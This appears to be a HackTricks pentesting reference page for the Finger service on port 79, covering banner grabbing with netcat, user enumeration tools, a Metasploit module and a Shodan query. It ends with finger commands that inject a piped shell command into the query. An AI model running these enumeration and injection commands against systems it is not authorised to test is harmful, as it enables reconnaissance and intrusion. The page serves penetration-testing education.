# 79 - Pentesting Finger

{{#include /banners/hacktricks-training.md}}




## **Basic Info**

The **Finger** program/service is utilized for retrieving details about computer users. Typically, the information provided includes the **user's login name, full name**, and, in some cases, additional details. These extra details could encompass the office location and phone number (if available), the time the user logged in, the period of inactivity (idle time), the last instance mail was read by the user, and the contents of the user's plan and project files.

**Default port:** 79

```
PORT   STATE SERVICE
79/tcp open  finger
```

## **Enumeration**

### **Banner Grabbing/Basic connection**

```bash
nc -vn <IP> 79
echo "root" | nc -vn <IP> 79
```

### **User enumeration**

```bash
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user
```

Alternatively you can use **finger-user-enum** from [**pentestmonkey**](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum), some examples:

```bash
finger-user-enum.pl -U users.txt -t 10.0.0.1
finger-user-enum.pl -u root -t 10.0.0.1
finger-user-enum.pl -U users.txt -T ips.txt
```

#### **Nmap execute a script for doing using default scripts**

### Metasploit uses more tricks than Nmap

```
use auxiliary/scanner/finger/finger_users
```

### Shodan

- `port:79 USER`

## Command execution

```bash
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```
